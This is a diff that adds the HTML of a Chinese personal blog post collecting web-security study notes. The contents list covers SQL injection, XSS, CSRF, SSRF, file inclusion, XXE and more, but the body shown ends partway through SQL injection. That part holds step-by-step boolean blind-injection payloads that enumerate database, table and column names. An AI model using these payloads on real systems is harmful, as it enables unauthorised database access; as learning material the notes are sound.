@@ -1,0 +1,729 @@
+<!DOCTYPE html><html lang="zh-CN/zn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>web安全整理 | 秋兮成風</title><meta name="description" content="SQL注入原理SQL注入是指web应用程序对用户输入数据的合法行为没有判断，前端传入后端的参数是可控的，并且参数带有数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作，也就是说前端的输入影响了后端的数据 满足条件1、参数用户可控2、参数被带入数据库查询 攻击普通注入1、 数字型注入2、字符型注入        需要闭合相对应的符号3、搜索型注入        闭合百分号 盲注常"><meta name="author" content="秋兮成風"><meta name="copyright" content="秋兮成風"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/tubiao.png"><link rel="canonical" href="http://yoursite.com/2021/04/03/web%E5%AE%89%E5%85%A8%E6%95%B4%E7%90%86/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta property="og:type" content="article"><meta property="og:title" content="web安全整理"><meta property="og:url" content="http://yoursite.com/2021/04/03/web%E5%AE%89%E5%85%A8%E6%95%B4%E7%90%86/"><meta property="og:site_name" content="秋兮成風"><meta property="og:description" content="SQL注入原理SQL注入是指web应用程序对用户输入数据的合法行为没有判断，前端传入后端的参数是可控的，并且参数带有数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作，也就是说前端的输入影响了后端的数据 满足条件1、参数用户可控2、参数被带入数据库查询 攻击普通注入1、 数字型注入2、字符型注入        需要闭合相对应的符号3、搜索型注入        闭合百分号 盲注常"><meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><meta property="article:published_time" content="2021-04-03T14:00:42.000Z"><meta property="article:modified_time" content="2021-04-04T11:15:55.503Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
+  document.documentElement.setAttribute('data-theme', 'dark')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
+  }
+}
+var activateLightMode = function () {
+  document.documentElement.setAttribute('data-theme', 'light')
+  if (document.querySelector('meta[name="theme-color"]') !== null) {
+    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
+  }
+}
+
+var getCookies = function (name) {
+  const value = `; ${document.cookie}`
+  const parts = value.split(`; ${name}=`)
+  if (parts.length === 2) return parts.pop().split(';').shift()
+}
+
+var autoChangeMode = 'false'
+var t = getCookies('theme')
+if (autoChangeMode === '1') {
+  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+  if (t === undefined) {
+    if (isLightMode) activateLightMode()
+    else if (isDarkMode) activateDarkMode()
+    else if (isNotSpecified || hasNoSupport) {
+      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
+      var now = new Date()
+      var hour = now.getHours()
+      var isNight = hour <= 6 || hour >= 18
+      isNight ? activateDarkMode() : activateLightMode()
+    }
+    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+      if (Cookies.get('theme') === undefined) {
+        e.matches ? activateDarkMode() : activateLightMode()
+      }
+    })
+  } else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else if (autoChangeMode === '2') {
+  now = new Date()
+  hour = now.getHours()
+  isNight = hour <= 6 || hour >= 18
+  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+  else if (t === 'light') activateLightMode()
+  else activateDarkMode()
+} else {
+  if (t === 'dark') activateDarkMode()
+  else if (t === 'light') activateLightMode()
+}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="prev" title="内网信息收集" href="http://yoursite.com/2021/04/04/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><link rel="next" title="文件上传" href="http://yoursite.com/2020/06/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  bookmark: {
+    message_prev: 'Press',
+    message_next: 'to bookmark this page'
+  },
+  runtime_unit: 'days',
+  runtime: false,
+  copyright: undefined,
+  ClickShowText: undefined,
+  medium_zoom: false,
+  fancybox: true,
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  baiduPush: false,
+  highlightCopy: true,
+  highlightLang: true,
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false    
+}</script><script>var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: undefined,
+  isSidebar: true
+  }</script><noscript><style>
+#nav {
+  opacity: 1
+}
+.justified-gallery img{
+  opacity: 1
+}
+</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">11</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">Tags</div><div class="length_num">7</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">Categories</div><div class="length_num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理"><span class="toc-number">1.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#满足条件"><span class="toc-number">1.1.1.</span> <span class="toc-text">满足条件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击"><span class="toc-number">1.2.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#普通注入"><span class="toc-number">1.2.1.</span> <span class="toc-text">普通注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-number">1.2.2.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#常用函数"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">常用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基于布尔型盲注"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">基于布尔型盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#基于时间"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">基于时间</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#宽字节注入"><span class="toc-number">1.2.3.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#原理-1"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#url转码"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">url转码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-number">1.2.4.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#定义和原理"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">定义和原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#条件"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#利用方式"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">利用方式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御"><span class="toc-number">1.3.</span> <span class="toc-text">防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#代码层面"><span class="toc-number">1.3.1.</span> <span class="toc-text">代码层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网络层面"><span class="toc-number">1.3.2.</span> <span class="toc-text">网络层面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它"><span class="toc-number">1.3.3.</span> <span class="toc-text">其它</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS"><span class="toc-number">2.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-2"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#原理简介"><span class="toc-number">2.1.1.</span> <span class="toc-text">原理简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型"><span class="toc-number">2.1.2.</span> <span class="toc-text">反射型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#存储型"><span class="toc-number">2.1.3.</span> <span class="toc-text">存储型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM型"><span class="toc-number">2.1.4.</span> <span class="toc-text">DOM型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害"><span class="toc-number">2.2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用方式-1"><span class="toc-number">2.3.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-1"><span class="toc-number">2.4.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">3.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-3"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-1"><span class="toc-number">3.2.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonp和cors跨域"><span class="toc-number">3.2.1.</span> <span class="toc-text">jsonp和cors跨域</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jsonp"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">jsonp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#cors跨域"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">cors跨域</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-2"><span class="toc-number">3.3.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">4.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-4"><span class="toc-number">4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可能出现的地方"><span class="toc-number">4.2.</span> <span class="toc-text">可能出现的地方</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-1"><span class="toc-number">4.3.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-2"><span class="toc-number">4.4.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞验证"><span class="toc-number">4.4.1.</span> <span class="toc-text">漏洞验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#利用方式-2"><span class="toc-number">4.4.2.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过"><span class="toc-number">4.4.3.</span> <span class="toc-text">绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-3"><span class="toc-number">4.5.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#扩展"><span class="toc-number">5.</span> <span class="toc-text">扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#问题"><span class="toc-number">5.1.</span> <span class="toc-text">问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料"><span class="toc-number">5.2.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#命令执行与代码执行"><span class="toc-number">6.</span> <span class="toc-text">命令执行与代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-5"><span class="toc-number">6.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-3"><span class="toc-number">6.2.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">6.2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#命令函数的利用"><span class="toc-number">6.2.2.</span> <span class="toc-text">命令函数的利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#经验心得"><span class="toc-number">6.2.3.</span> <span class="toc-text">经验心得</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-2"><span class="toc-number">6.3.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-4"><span class="toc-number">6.4.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考资料-1"><span class="toc-number">6.5.</span> <span class="toc-text">参考资料</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含"><span class="toc-number">7.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-6"><span class="toc-number">7.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-4"><span class="toc-number">7.2.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP中文件包含的函数"><span class="toc-number">7.2.1.</span> <span class="toc-text">PHP中文件包含的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含的特性"><span class="toc-number">7.2.2.</span> <span class="toc-text">文件包含的特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#条件-1"><span class="toc-number">7.2.3.</span> <span class="toc-text">条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用"><span class="toc-number">7.2.4.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#本地文件包含"><span class="toc-number">7.2.4.1.</span> <span class="toc-text">本地文件包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#有限制本地文件包含绕过"><span class="toc-number">7.2.4.2.</span> <span class="toc-text">有限制本地文件包含绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程文件包含"><span class="toc-number">7.2.5.</span> <span class="toc-text">远程文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#常见的敏感信息路径"><span class="toc-number">7.2.6.</span> <span class="toc-text">常见的敏感信息路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php伪协议"><span class="toc-number">7.2.7.</span> <span class="toc-text">php伪协议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-5"><span class="toc-number">7.3.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件上传"><span class="toc-number">8.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-7"><span class="toc-number">8.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-3"><span class="toc-number">8.2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-5"><span class="toc-number">8.3.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用技巧"><span class="toc-number">8.3.1.</span> <span class="toc-text">漏洞利用技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#客户端校验（js）"><span class="toc-number">8.3.1.1.</span> <span class="toc-text">客户端校验（js）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#服务端检测"><span class="toc-number">8.3.1.2.</span> <span class="toc-text">服务端检测</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-6"><span class="toc-number">8.4.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#任意文件读取与下载"><span class="toc-number">9.</span> <span class="toc-text">任意文件读取与下载</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-8"><span class="toc-number">9.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害-4"><span class="toc-number">9.2.</span> <span class="toc-text">危害</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-6"><span class="toc-number">9.3.</span> <span class="toc-text">攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用方式-3"><span class="toc-number">9.3.1.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#技巧"><span class="toc-number">9.3.2.</span> <span class="toc-text">技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#重要位置"><span class="toc-number">9.3.3.</span> <span class="toc-text">重要位置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#操作系统常用函数"><span class="toc-number">9.3.3.1.</span> <span class="toc-text">操作系统常用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常见的网络架构"><span class="toc-number">9.3.3.2.</span> <span class="toc-text">常见的网络架构</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与文件包含的区别"><span class="toc-number">9.3.4.</span> <span class="toc-text">与文件包含的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Google-Hacking"><span class="toc-number">9.3.5.</span> <span class="toc-text">Google Hacking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#心得"><span class="toc-number">9.3.6.</span> <span class="toc-text">心得</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#案例"><span class="toc-number">9.3.7.</span> <span class="toc-text">案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-7"><span class="toc-number">9.4.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#发序列化漏洞"><span class="toc-number">10.</span> <span class="toc-text">发序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-9"><span class="toc-number">10.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-7"><span class="toc-number">10.2.</span> <span class="toc-text">攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-number">11.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-10"><span class="toc-number">11.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击-8"><span class="toc-number">11.2.</span> <span class="toc-text">攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御-8"><span class="toc-number">11.3.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#逻辑漏洞"><span class="toc-number">12.</span> <span class="toc-text">逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#原理-11"><span class="toc-number">12.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#攻击及防御"><span class="toc-number">12.2.</span> <span class="toc-text">攻击及防御</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#登陆认证模块测试"><span class="toc-number">12.2.1.</span> <span class="toc-text">登陆认证模块测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#业务办理模块测试"><span class="toc-number">12.2.2.</span> <span class="toc-text">业务办理模块测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#业务授权访问模块"><span class="toc-number">12.2.3.</span> <span class="toc-text">业务授权访问模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#未授权访问"><span class="toc-number">12.2.3.1.</span> <span class="toc-text">未授权访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#越权访问"><span class="toc-number">12.2.3.2.</span> <span class="toc-text">越权访问</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#输入、输出模块测试-登录框"><span class="toc-number">12.2.4.</span> <span class="toc-text">输入、输出模块测试  登录框</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#回退模块测试"><span class="toc-number">12.2.5.</span> <span class="toc-text">回退模块测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#验证码机制测试"><span class="toc-number">12.2.6.</span> <span class="toc-text">验证码机制测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#业务数据安全测试"><span class="toc-number">12.2.7.</span> <span class="toc-text">业务数据安全测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#业务流程乱序测试"><span class="toc-number">12.2.8.</span> <span class="toc-text">业务流程乱序测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#密码找回模块测试"><span class="toc-number">12.2.9.</span> <span class="toc-text">密码找回模块测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#业务接口调用模块测试"><span class="toc-number">12.2.10.</span> <span class="toc-text">业务接口调用模块测试</span></a></li></ol></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">秋兮成風</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">web安全整理</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="Created 2021-04-03 22:00:42"><i class="far fa-calendar-alt fa-fw"></i> Created 2021-04-03</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="Updated 2021-04-04 19:15:55"><i class="fas fa-history fa-fw"></i> Updated 2021-04-04</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>Post View:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>SQL注入是指web应用程序对用户输入数据的合法行为没有判断，前端传入后端的参数是可控的，并且参数带有数据库查询，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作，也就是说前端的输入影响了后端的数据</p>
+<h3 id="满足条件"><a href="#满足条件" class="headerlink" title="满足条件"></a>满足条件</h3><p>1、参数用户可控<br>2、参数被带入数据库查询</p>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>1、 数字型注入<br>2、字符型注入<br>        需要闭合相对应的符号<br>3、搜索型注入<br>        闭合百分号</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p><code>length()</code>  返回字符串的长度<br><code>substr()</code>  截取字符串<br><code>ascii()</code>  返回字符串的ASCII码<br><code>sleep(n)</code>  将程序挂起n秒<br><code>if(exp1, exp2, exp3)</code>  判断语句，如果exp1成立，则执行exp2,若不成立则执行exp3</p>
+<h4 id="基于布尔型盲注"><a href="#基于布尔型盲注" class="headerlink" title="基于布尔型盲注"></a>基于布尔型盲注</h4><p><strong>返回true或false</strong><br>利用过程：</p>
+<blockquote>
+<ul>
+<li>首先我们需要判断数据库长度 ‘ or length(database()) = 8 #返回true说明数据 库长度为8 </li>
+<li>获取数据库名字 ‘ or ord(mid(database(),1,1)) =’ascill值’# 依次获取 </li>
+<li>获取表的总数 ‘ or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_ SCHEMA=database() )= 2# </li>
+<li>获取表的长度(第一个表) ‘ or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_ SCHEMA=database() limit 0,1 )= (猜测得长度)# </li>
+<li>获取表的内容 ‘ or mid((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1),1,1) = ‘ a’ # </li>
+<li>获取表的字段的总数 ‘ or (select count(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=表名 ) = 8# 8返回true说明有8个 表</li>
+<li>依次类推,最后推出内容。因为是盲猜所以只能这 样一个一个去推手工比较麻烦 通常使用sqlmap 进行注入</li>
+</ul>
